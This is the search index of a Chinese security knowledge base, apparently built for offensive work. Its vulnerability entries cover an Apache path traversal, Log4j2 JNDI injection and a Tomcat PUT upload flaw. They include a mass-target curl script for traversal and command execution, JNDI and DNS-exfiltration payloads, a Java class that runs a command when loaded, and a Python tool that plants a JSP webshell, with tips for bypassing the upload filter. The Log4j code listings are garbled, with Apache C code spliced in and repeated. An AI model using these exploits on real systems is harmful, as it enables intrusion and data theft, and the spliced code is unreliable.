{"./":{"url":"./","title":"Introduction","keywords":"","body":"/| .--. .--. . .--. || |__| _ _ |__| .'| |__| || .--. .| /\\ \\\\ // .--. .' | .--. || __ | | .' |_ `\\\\ //\\\\ // | | A permanently free and open source knowledge base for cyber security | 一个永久免费 、开源的网络安全知识库 "},"杂七杂八/工具推荐/":{"url":"杂七杂八/工具推荐/","title":"工具推荐","keywords":"","body":" 该目录内包含了一系列实战阶段，常用且好用的工具。欢迎各位按照习惯使用&补充 /| .--. .--. . .--. || |__| _ _ |__| .'| |__| || .--. .| /\\ \\\\ // .--. .' | .--. || __ | | .' |_ `\\\\ //\\\\ // | | "},"杂七杂八/工具推荐/信息收集.html":{"url":"杂七杂八/工具推荐/信息收集.html","title":"信息收集","keywords":"","body":"CertEagle - 使用实时 CT 日志提要的资产监控实用程序 Aquatone - 一种跨大量主机的网站视觉截图检查工具，可以方便地快速了解基于 HTTP 的攻击面。 ffuf - 一款支持高并发的Fuzz工具 "},"杂七杂八/提交模板/":{"url":"杂七杂八/提交模板/","title":"提交模板","keywords":"","body":" 该目录内包含了一系列提交文章所用到的模板，请自行寻找适用于自己的模板，修改内容后打包发送至邮箱: team@onebit.tk /| .--. .--. . .--. || |__| _ _ |__| .'| |__| || .--. .| /\\ \\\\ // .--. .' | .--. || __ | | .' |_ `\\\\ //\\\\ // | | "},"杂七杂八/提交模板/漏洞文库模板.html":{"url":"杂七杂八/提交模板/漏洞文库模板.html","title":"漏洞文库模板","keywords":"","body":"CVE-xxx-xxx-xxx | xx >= 2.5.2 存在xxx漏洞 标题 格式为:CVE编号 | 版本简述、漏洞类型 0x00 漏洞说明 此段落简单明确的描写漏洞产生的影响 在Apache HTTP Server x.x.x.x 中对路径规范化所做的更改中发现了一个缺陷。攻击者可以使用路径遍历攻击穿越到服务器目录以外。在开启CGI配置后，将会从目录穿越 / 信息泄露升级为RCE。 0x01 影响版本 此段落描写受漏洞影响的软件版本 == Apache HTTP Server x.x.x.x 0x02 漏洞成因 此段落简明描写漏洞是由什么原因造成的，是哪个函数引发的漏洞等 由于在Apache HTTP Server x.x.x升级到 Apache HTTP Server x.x.x时，对路径规范化所做的更改中出现漏洞，该漏洞是由于 server/util.c\\ 中的 ap_normalize_path\\ 函数 一次解析一个 Unicode 值并在所有字符都被解码之前尝试检测遍历逻辑导致的。 当攻击者在 URL 中使用 /.%2e/\\ 时，第 572 行的逻辑不会将 %2e\\ 识别为句号，此时该字符尚未被解码。但该版本Apache HTTP Servers并没有在这种情况下将整体URL进行解码并匹配目录穿越过滤，导致 /.%2e/ 被 直接代入传递，导致目录穿越。 该漏洞默认配置情况下只存在目录遍历，但开启不受限制的 mod_cgi\\ 功能将会造成RCE 0x03 漏洞代码 此段落贴出该系统漏洞所在的代码块与文件目录，由于本文库使用了插件，可以在代码块上方使用 !FILENAME 的格式撰写 ，尽量不使用图片，图片或代码块下方可以简单描述 server/util.c # server/util.c 第 561 – 596 行 if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w > 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } 0x04 详细分析 该段落主要撰写详细分析漏洞存在的原因，例如什么函数导致了什么 当攻击者在 URL 中使用 /.%2e/\\ 时，第 572 行的逻辑不会将 %2e\\ 识别为句号，此时该字符尚未被解码。但该版本Apache HTTP Servers并没有在这种情况下将整体URL进行解码并匹配目录穿越过滤，导致 /.%2e/ 被 直接代入传递，导致目录穿越，具体如下: server/util.c /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) #上面的代码错误判断了目录穿越的payload，&& 判断只有在目录.的后面跟的是/或者空的时候才会触发次规则，并且没有解URL编码的%2e传入后并不会对%2e解码进行回溯验证，也不会对整体URL进行解码匹配，而是只识别了%,2,e #define IS_SLASH(s) (s == '/') #define IS_SLASH_OR_NUL(s) (s == '\\0' || IS_SLASH(s)) 0x05 漏洞指纹 该段落主要用于描写漏洞指纹或者特征截图,可选 fofa: title=\"apache\" 0x06 POC & EXP 主要存放一些用于该漏洞的EXP & POC，可以是漏洞复现，但要求尽量少用图片的方式，精简内容，比如截图漏洞点，文本描述漏洞复现经过，粘贴burp数据包等 exp.sh # Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal # Date: 10/05/2021 # Exploit Author: Lucas Souza https://lsass.io # Vendor Homepage: https://apache.org/ # Version: 2.4.49 # Tested on: 2.4.49 # CVE : CVE-2021-41773 # Credits: Ash Daulton and the cPanel Security Team #!/bin/bash if [[ $1 =3D=3D '' ]]; [[ $2 =3D=3D '' ]]; then echo Set [TAGET-LIST.TXT] [PATH] echo ./PoC.sh targets.txt /etc/passwd exit fi for host in $(cat $1); do curl --silent --path-as-is --insecure \"$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2\"; done # PoC.sh targets.txt /etc/passwd # PoC.sh targets.txt /bin/sh whoami 0x07 进阶利用思路 该段落描写一些自我理解和实战环境中的进阶利用思路 在特殊情况下可对网页配置文件进行读取，发现数据库连接密码等铭感信息 可使用bash直接反弹shell 0x08 冗余项 此段落不限制段落数量，根据需求添加 0x09 扩展链接 此段落主要撰写扩展阅读链接，以及详细分析该漏洞的文章等 Apache Httpd Cve 2021 41773 And Cve 2021 42013 漏洞详细分析 0x10 联系方式 此段落主要撰写该文章的联系方式，在审核结束后会根据作者意愿保留 / 删除 作者 : BitWiki支持团队 "},"漏洞文库/Apache/":{"url":"漏洞文库/Apache/","title":"Apache","keywords":"","body":"Apache软件基金会，是专门为支持开源软件项目而办的一个非营利性组织。在它所支持的Apache项目与子项目中，所发行的软件产品都遵循Apache许可证。 "},"漏洞文库/Apache/Log4j2/":{"url":"漏洞文库/Apache/Log4j2/","title":"Log4j2","keywords":"","body":"Apache Log4j 2是Log4j的升级版，与它的前身Log4j 1.x相比有了很大的改进，并提供了Logback中的许多改进，同时修复了Logback架构中的一些固有问题。 "},"漏洞文库/Apache/Log4j2/CVE-2021-44428  log4j2  2.14.x 存在JNDI RCE漏洞.html":{"url":"漏洞文库/Apache/Log4j2/CVE-2021-44428  log4j2  2.14.x 存在JNDI RCE漏洞.html","title":"CVE 2021 44428  Log4j2  2.14.X 存在JNDI RCE漏洞","keywords":"","body":"CVE-2021-44428 | log4j2 >= 2.14.x 存在JNDI RCE漏洞 0x00 漏洞说明 Apache Log4j2 版本 2.14.x 及以下版本存在远程代码执行漏洞。攻击者可在任何可记录在日志消息的参数中进行 JNDI 注入。当启用消息查找替换时，攻击者可以控制日志消息或日志消息的参数并执行从 LDAP 服务器加载的任意代码。 0x01 影响版本 0x02 漏洞成因 LogManager.getLogger().error() 与 LogManager.getLogger().fatal() 默认情况下记录错误日志，并经过递归拼接最终进入lookup方法，导致JNDI注入 0x03 漏洞代码 MessagePatternConverter.format @Override public void format(final LogEvent event, final StringBuilder toAppendTo) { final Message msg = event.getMessage(); if (msg instanceof StringBuilderFormattable) { final boolean doRender = textRenderer != null; final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo; final int offset = workingBuilder.length(); if (msg instanceof MultiFormatStringBuilderFormattable) { ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder); } else { ((StringBuilderFormattable) msg).formatTo(workingBuilder); } if (config != null && !noLookups) { for (int i = offset; i MessagePatternConverter.format @Override public void format(final LogEvent event, final StringBuilder toAppendTo) { final Message msg = event.getMessage(); if (msg instanceof StringBuilderFormattable) { final boolean doRender = textRenderer != null; final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo; final int offset = workingBuilder.length(); if (msg instanceof MultiFormatStringBuilderFormattable) { ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder); } else { ((StringBuilderFormattable) msg).formatTo(workingBuilder); } if (config != null && !noLookups) { for (int i = offset; i MessagePatternConverter.format @Override public void format(final LogEvent event, final StringBuilder toAppendTo) { final Message msg = event.getMessage(); if (msg instanceof StringBuilderFormattable) { final boolean doRender = textRenderer != null; final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo; final int offset = workingBuilder.length(); if (msg instanceof MultiFormatStringBuilderFormattable) { ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder); } else { ((StringBuilderFormattable) msg).formatTo(workingBuilder); } if (config != null && !noLookups) { for (int i = offset; i !FILENAME MessagePatternConverter.format @Override public void format(final LogEvent event, final StringBuilder toAppendTo) { final Message msg = event.getMessage(); if (msg instanceof StringBuilderFormattable) { final boolean doRender = textRenderer != null; final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo; final int offset = workingBuilder.length(); if (msg instanceof MultiFormatStringBuilderFormattable) { ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder); } else { ((StringBuilderFormattable) msg).formatTo(workingBuilder); } if (config != null && !noLookups) { for (int i = offset; i 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } #39; && workingBuilder.charAt(i + 1) == '{') { // 这个value是：${jndi:ldap://127.0.0.1:1389/badClassName} final String value = workingBuilder.substring(offset, workingBuilder.length()); workingBuilder.setLength(offset); // 跟入replace方法 workingBuilder.append(config.getStrSubstitutor().replace(event, value)); } } } if (doRender) { textRenderer.render(workingBuilder, toAppendTo); } return; } if (msg != null) { String result; if (msg instanceof MultiformatMessage) { result = ((MultiformatMessage) msg).getFormattedMessage(formats); } else { result = msg.getFormattedMessage(); } if (result != null) { toAppendTo.append(config != null && result.contains(\"${\") ? config.getStrSubstitutor().replace(event, result) : result); } else { toAppendTo.append(\"null\"); } } }# server/util.c 第 561 – 596 行 if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w > 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } #39; && workingBuilder.charAt(i + 1) == '{') { // 这个value是：${jndi:ldap://127.0.0.1:1389/badClassName} final String value = workingBuilder.substring(offset, workingBuilder.length()); workingBuilder.setLength(offset); // 跟入replace方法 workingBuilder.append(config.getStrSubstitutor().replace(event, value)); } } } if (doRender) { textRenderer.render(workingBuilder, toAppendTo); } return; } if (msg != null) { String result; if (msg instanceof MultiformatMessage) { result = ((MultiformatMessage) msg).getFormattedMessage(formats); } else { result = msg.getFormattedMessage(); } if (result != null) { toAppendTo.append(config != null && result.contains(\"${\") ? config.getStrSubstitutor().replace(event, result) : result); } else { toAppendTo.append(\"null\"); } } }# server/util.c 第 561 – 596 行 if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w > 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } #39; && workingBuilder.charAt(i + 1) == '{') { // 这个value是：${jndi:ldap://127.0.0.1:1389/badClassName} final String value = workingBuilder.substring(offset, workingBuilder.length()); workingBuilder.setLength(offset); // 跟入replace方法 workingBuilder.append(config.getStrSubstitutor().replace(event, value)); } } } if (doRender) { textRenderer.render(workingBuilder, toAppendTo); } return; } if (msg != null) { String result; if (msg instanceof MultiformatMessage) { result = ((MultiformatMessage) msg).getFormattedMessage(formats); } else { result = msg.getFormattedMessage(); } if (result != null) { toAppendTo.append(config != null && result.contains(\"${\") ? config.getStrSubstitutor().replace(event, result) : result); } else { toAppendTo.append(\"null\"); } } }# server/util.c 第 561 – 596 行 if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w > 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } 0x04 详细分析 在了解了相关漏洞情报和查看了相关补丁更改记录可以得出，该漏洞是通过jndi中LDAP注入的方式导致了RCE，并在对lookup函数进行了判断修改后又限制了jndi对LDAP的访问 翻阅官方文档中关于lookup的说明 Lookups provide a way to add values to the Log4j configuration at arbitrary places. They are a particular type of Plugin that implements the StrLookup interface. Information on how to use Lookups in configuration files can be found in the Property Substitution section of the Configuration page. lookup 提供了⼀种在任意位置向 Log4j2 配置添加值的⽅法，是实现 StrLookup 接⼝的特殊类型 的插件。 且 log4j支持的方法： base64 、 data 、 ctx 、 main 、 env 、 sys 、 sd 、 java 、 marker 、 jndi 、 jvmrunargs 、 map 、 bundle 、 log4j 在官方文档中给出了JNDI lookup的用法说明 JndiLookup 允许通过 JNDI 检索变量。默认情况下，该键将以 java:comp/env/ 为前缀，但是如果该键包含“:”，则不会添加前缀。 %d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n 在Log4j 2.17.0之前存在漏洞的版本中，默认存在漏洞，且支持ldap协议，在之后需要设置enableJndiLookup且只支持java协议 实际上log4j中jndi的用法格式为: ${jndi:JNDIContent} 既然明确了漏洞出发的方法，那么就要去找入口点: LogManager.getLogger().xxxx() 方法便是传入jndi语句的入口点 在log4j中，共有8个日志级别，可以通过 LogManager.getLogger() 调用记录日志的方法如 下： LogManager.getLogger().error() LogManager.getLogger().fatal() LogManager.getLogger().trace() LogManager.getLogger().traceExit() LogManager.getLogger().traceEntry() LogManager.getLogger().info() LogManager.getLogger().warn() LogManager.getLogger().debug() LogManager.getLogger().log() LogManager.getLogger().printf() 在默认情况下，error()和fatal()方法可以触发漏洞，其余方法需要令行配置，并且可以通过isInfoEnabled()和其他函数检查状态: 原因是在logIfEnabled方法中，对当前日志等级进行了一次判断: 该方法返回一个布尔值，只有在当前事件的日志等级大于或等于设置的日志等级时，才会符合条件，当返回值为 True 时，将继续 logMessage() 方法。 这里拿error举例说明: Logger logger = LogManager.getLogger(); logger.error(\"error message: {}\",${jndi:rmi:///}); 查看error的类继承关系可以发现，实际上被调用的是 AbstractLogger.java 中的 public void eror() 方法 当消息进入到error()方法时，会传入到logIfEnabled()中进行逻辑判断日志等级 当isEnabled()返回True后，将会继续logMessage()方法 logMessage() 调用 logMessageSafely()： ogMessageSafely() 调用 logMessageTrackRecursion() logMessageTrackRecursion() 调用 tryLogMessage() private void tryLogMessage(final String fqcn, final StackTraceElement location, final Level level, final Marker marker, final Message message, final Throwable throwable) { try { log(level, marker, fqcn, location, message, throwable); } catch (final Exception e) { handleLogMessageException(e, fqcn, message); } } 不动态调试的情况下跟log方法会到AbstractLogger.log方法，实际上这里是org.apache.logging.log4j.core.Loggger.log方法 @Override protected void log(final Level level, final Marker marker, final String fqcn, final StackTraceElement location, final Message message, final Throwable throwable) { final ReliabilityStrategy strategy = privateConfig.loggerConfig.getReliabilityStrategy(); if (strategy instanceof LocationAwareReliabilityStrategy) { // 触发点 ((LocationAwareReliabilityStrategy) strategy).log(this, getName(), fqcn, location, marker, level, message, throwable); } else { strategy.log(this, getName(), fqcn, marker, level, message, throwable); } } 跟入这里的log方法到org/apache/logging/log4j/core/config/DefaultReliabilityStrategy.log @Override public void log(final Supplier reconfigured, final String loggerName, final String fqcn, final StackTraceElement location, final Marker marker, final Level level, final Message data, final Throwable t) { loggerConfig.log(loggerName, fqcn, location, marker, level, data, t); } 进入LoggerConfig.log方法 @PerformanceSensitive(\"allocation\") public void log(final String loggerName, final String fqcn, final StackTraceElement location, final Marker marker, final Level level, final Message data, final Throwable t) { // 无需关心的代码 ... try { // 跟入 log(logEvent, LoggerConfigPredicate.ALL); } finally { ReusableLogEventFactory.release(logEvent); } } LoggerConfig另一处重载log方法 protected void log(final LogEvent event, final LoggerConfigPredicate predicate) { if (!isFiltered(event)) { // 跟入 processLogEvent(event, predicate); } } processLogEvent private void processLogEvent(final LogEvent event, final LoggerConfigPredicate predicate) { event.setIncludeLocation(isIncludeLocation()); if (predicate.allow(this)) { // 关键点 callAppenders(event); } logParent(event, predicate); } 可以看到调用appender.control的callAppenders方法 @PerformanceSensitive(\"allocation\") protected void callAppenders(final LogEvent event) { final AppenderControl[] controls = appenders.get(); //noinspection ForLoopReplaceableByForEach for (int i = 0; i 层层跟入到AppenderControl.tryCallAppender方法 private void callAppender0(final LogEvent event) { ensureAppenderStarted(); if (!isFilteredByAppender(event)) { // 跟入 tryCallAppender(event); } } private void tryCallAppender(final LogEvent event) { try { // 跟入 appender.append(event); } catch (final RuntimeException error) { handleAppenderError(event, error); } catch (final Exception error) { handleAppenderError(event, new AppenderLoggingException(error)); } } 进入AbstractOutputStreamAppender.append方法，进入到directEncodeEvent方法 protected void directEncodeEvent(final LogEvent event) { getLayout().encode(event, manager); if (this.immediateFlush || event.isEndOfBatch()) { manager.flush(); } } 关注其中的encode方法跟入到PatternLayout.encode方法 @Override public void encode(final LogEvent event, final ByteBufferDestination destination) { if (!(eventSerializer instanceof Serializer2)) { super.encode(event, destination); return; } final StringBuilder text = toText((Serializer2) eventSerializer, event, getStringBuilder()); final Encoder encoder = getStringBuilderEncoder(); encoder.encode(text, destination); trimToMaxSize(text); } 不用关心 encode 方法中多余的代码，这里触发点在toText方法 private StringBuilder toText(final Serializer2 serializer, final LogEvent event, final StringBuilder destination) { return serializer.toSerializable(event, destination); } 从toText中转入toSerializable @Override public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) { final int len = formatters.length; for (int i = 0; i 这里的formatters方法包含了多个formatter对象，其中出发漏洞的是第8个，其中包含MessagePatternConverter 跟入看到调用了Converter相关的方法 public void format(final LogEvent event, final StringBuilder buf) { if (skipFormattingInfo) { converter.format(event, buf); } else { formatWithInfo(event, buf); } } 不难看出每个formatter和converter为了构造日志的每一部分，这里在构造真正的日志信息字符串部分 跟入MessagePatternConverter.format方法，看到核心的部分 @Override public void format(final LogEvent event, final StringBuilder toAppendTo) { final Message msg = event.getMessage(); if (msg instanceof StringBuilderFormattable) { final boolean doRender = textRenderer != null; final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo; final int offset = workingBuilder.length(); if (msg instanceof MultiFormatStringBuilderFormattable) { ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder); } else { ((StringBuilderFormattable) msg).formatTo(workingBuilder); } if (config != null && !noLookups) { for (int i = offset; i 上面的步骤其实是一环套一环，排除一些不关键的调用路径，过程如下: logMessage > logMessageSafely > logMessageTrackRecursion > tryLogMessage > log > DefaultReliabilityStrategy.log > loggerConfig.log > processLogEvent > callAppenders > tryCallAppender > append > tryAppend > directEncodeEvent > encode > toText > toSerializable > format > PatternFormatter.format 第一个关键点在上文中 PatternFormatter.java 中的 format 方法: 红框标记内容为: 如果 config 不为 null，并且 nolookups 变量设置为 false，它将继续检查字符串是否以 ${ 开头（ 如果递归检测到 $ 字符后跟了一个 { 字符，那么会对直到 } 中间的内容进行解析） 红框上方的内容: if (config != null && !noLookups) 如果config 不为 null ，并且 nolookups 变量设置为 false，才会继续 ${ 字符串检查 那么nsLookups又是从何而来? 这是一个布尔值，它取决于 Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 和 noLookupsIdx >= 0 noLookupsIdx 来自 loadNoLookups(options) NOLOOKUPS 是一个常数 由于没有提供 loadNoLookups()中所需的options loadNoLookups() 将返回 -1，这使得 noLookupsIdx >= 0 为 false。 那么常量来自属性值： 再看下面那行 workingBuilder.append(config.getStrSubstitutor().replace(event, value)); 进入StrSubstitutor.replace方法 public String replace(final LogEvent event, final String source) { if (source == null) { return null; } final StringBuilder buf = new StringBuilder(source); // 跟入 if (!substitute(event, buf, 0, source.length())) { return source; } return buf.toString(); } 跟入StrSubstitutor.substitute方法，存在递归，逻辑较长,主要作用是递归处理日志输入，转为对应的输出 private int substitute(final LogEvent event, final StringBuilder buf, final int offset, final int length, List priorVariables) { ... substitute(event, bufName, 0, bufName.length()); ... String varValue = resolveVariable(event, varName, buf, startPos, endPos); ... int change = substitute(event, buf, startPos, varLen, priorVariables); } 在这里要说一下，触发漏洞的必要条件其实就是此章节最上头写的那些: Logger logger = LogManager.getLogger(); logger.error(\"error message: {}\",${jndi:rmi:///}); 通常程序员会写下这样的日志代码，去记录一些错误日志，当攻击方输入恶意payload后，将会使变量进行更改，类似 logger.error(\"error_message:${jndi:ldap://127.0.0.1:1389/badClassName}\"); 而StrSubstitutor.substitute的递归将使jndi:ldap://127.0.0.1:1389/badClassName进入resolveVariable 方法 经过调试确认了关键方法resolveVariable protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) { final StrLookup resolver = getVariableResolver(); if (resolver == null) { return null; } // 进入 return resolver.lookup(event, variableName); } 接下来进入了最关键的lookup()方法: @Override public String lookup(final LogEvent event, String var) { if (var == null) { return null; } final int prefixPos = var.indexOf(PREFIX_SEPARATOR); if (prefixPos >= 0) { final String prefix = var.substring(0, prefixPos).toLowerCase(Locale.US); final String name = var.substring(prefixPos + 1); // 关键 final StrLookup lookup = strLookupMap.get(prefix); if (lookup instanceof ConfigurationAware) { ((ConfigurationAware) lookup).setConfiguration(configuration); } String value = null; if (lookup != null) { // 这里的name是：ldap://127.0.0.1:1389/badClassName value = event == null ? lookup.lookup(name) : lookup.lookup(event, name); } if (value != null) { return value; } var = var.substring(prefixPos + 1); } if (defaultLookup != null) { return event == null ? defaultLookup.lookup(var) : defaultLookup.lookup(event, var); } return null; } 其中画框重点的 strLookupMap 包含以下值(内置方法)： 如果匹配到内置方法，那么就进入对应的处理方法，这里是 JNDI 方法，那么就会由JndiLookup类进一步处理 最终加载由攻击者传入的LDAP服务端地址，然后返回一个恶意的 JNDI Reference对象，触发漏 洞，实现 RCE 0x05 漏洞指纹 fofa: app=\"log4j2\" 0x06 POC & EXP !FILENAME exp.java public class Exploit { static { try { String command = \"touch /tmp/exploit.txt\"; // String[] commands = {\"bash\", \"-c\", command}; // System.out.println(\"cmd : \"+ commands[0]); int result = java.lang.Runtime.getRuntime().exec(commands).waitFor(); System.out.println(\"result : \"+ result); } catch (Exception e){ e.printStackTrace(); } } public static void main(String[] args) throws InterruptedException { new Exploit(); } } 0x07 进阶利用思路 DNS信息外带 !FILENAME POC ${jndi:ldap://${sys:java.version}.xxxx.dnslog.cn} 0x08 扩展链接 https://n0b1ta.github.io/CVE-2021-44228-Apache-Log4jshell%E7%9A%84%E6%B7%B1%E5%85%A5%E6%80%9D%E8%80%83 https://security.tencent.com/index.php/blog/msg/131 https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/ https://xz.aliyun.com/t/10649 https://www.reddit.com/r/blueteamsec/comments/rd38z9/log4j_0day_being_exploited/ https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/ https://www.youtube.com/watch?v=Y8a5nB-vy78 0x9 联系方式 作者 : BitWiki支持团队 "},"漏洞文库/Apache/TomCat/":{"url":"漏洞文库/Apache/TomCat/","title":"TomCat","keywords":"","body":"Apache Tomcat是美国阿帕奇（Apache）软件基金会下属的Jakarta项目的一款轻量级Web应用服务器，它主要用于开发和调试JSP程序，适用于中小型系统。 "},"漏洞文库/Apache/TomCat/CVE-2017-12615 Tomcat  存在PUT请求文件上传漏洞.html":{"url":"漏洞文库/Apache/TomCat/CVE-2017-12615 Tomcat  存在PUT请求文件上传漏洞.html","title":"CVE 2017 12615 Tomcat  存在PUT请求文件上传漏洞","keywords":"","body":"CVE-2017-12615| TomCat 存在PUT请求任意 文件上传漏洞 0x00 漏洞说明 Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。 由于在 tomcat 7.0.0-7.0.81 版本区间，将配置文件conf/web.xml中的readonly设置为了 false 导致服务器接收和处理PUT方法上传的任意文件。 0x01 影响版本 Apache Tomcat 7.0.0-7.0.81 0x02 漏洞成因 由于配置不当（非默认配置），将配置文件conf/web.xml中的readonly设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀的上传 0x03 漏洞代码 暂无 0x04 详细分析 当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限 0x05 漏洞指纹 fofa: app=\"Apache-Tomcat\" 0x06 POC & EXP exp.py #CVE-2017-12615 EXP __author__ = '纸机' import requests import optparse import time parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT]') parse.add_option('-u','--url',dest='URL',help='target url') parse.add_option('-p','--port',dest='PORT',help='target port[default:8080]',default='8080') options,args = parse.parse_args() #验证参数是否完整 if not options.URL or not options.PORT: print('Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\\n') exit('CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help') url = options.URL+':'+options.PORT filename = '/backdoor.jsp' payload = filename+'?pwd=023&i=' headers = {\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0\"} #木马 data = '''\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\"); } %>''' #上传木马文件 def upload(url): print('[*] 目标地址:'+url) try: respond = requests.put(url+filename+'/',headers=headers,data = data) #print(respond.status_code) if respond.status_code == 201 or respond.status_code == 204: #print('[*] 目标地址:'+url) print('[+] 木马上传成功') except Exception as e: print('[-] 上传失败') return 0 #命令执行 def attack(url,cmd): try: respond = requests.get(url+payload+cmd) if respond.status_code == 200: print(str(respond.text).replace(\"\",\"\").replace(\"\",\"\").strip()) except Exception as e: print('[-] 命令执行错误') if upload(url) == 0: exit() time.sleep(0.5) print('输入执行命令(quit退出):') while(1): cmd = input('>>>') if(cmd == 'quit'): break attack(url,cmd) poc.py #CVE-2017-12615 POC __author__ = '纸机' import requests import optparse import os parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]') parse.add_option('-u','--url',dest='URL',help='target url') parse.add_option('-p','--port',dest='PORT',help='target port[default:8080]',default='8080') parse.add_option('-f',dest='FILE',help='target list') options,args = parse.parse_args() #print(options) #验证参数是否完整 if (not options.URL or not options.PORT) and not options.FILE: print('Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] [-f FILE]\\n') exit('CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help') filename = '/hello.jsp' #测试数据 data = 'hello' #提交PUT请求 #resp = requests.post(url1,headers=headers,data=data) #验证文件是否上传成功 #response = requests.get(url2) #上传文件 def upload(url): try: response = requests.put(url+filename+'/',data=data) return 1 except Exception as e: print(\"[-] {0} 连接失败\".format(url)) return 0 def checking(url): try: #验证文件是否上传成功 response = requests.get(url+filename) #print(url+filename) if response.status_code == 200 and 'hello' in response.text: print('[+] {0} 存在CVE-2017-12615 Tomcat 任意文件读写漏洞'.format(url)) else: print('[-] {0} 不存在CVE-2017-12615 Tomcat 任意文件读写漏洞'.format(url)) except Exception as e: #print(e) print(\"[-] {0} 连接失败\".format(url)) if options.FILE and os.path.exists(options.FILE): with open(options.FILE) as f: urls = f.readlines() #print(urls) for url in urls: url = str(url).replace('\\n', '').replace('\\r', '').strip() if upload(url) == 1: checking(url) elif options.FILE and not os.path.exists(options.FILE): print('[-] {0} 文件不存在'.format(options.FILE)) else: #上传链接 url = options.URL+':'+options.PORT if upload(url) == 1: checking(url) 0x07 进阶利用思路 抓包改PUT方法，写文件，连接即可。 PUT /test1.jsp/ HTTP/1.1 Host: xxxx User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Content-Length: 616 绕过方式: 在默认情况下，限制了jsp文件的上传，可通过以下方式绕过 #方法1 文件名后加 / 符号 #方法2 文件名后加 %20 #方法3 文件名后加 ::$DATA 0x08 扩展链接 Tomcat任意文件写入（CVE-2017-12615）漏洞复现-含POC和EXP 0x9 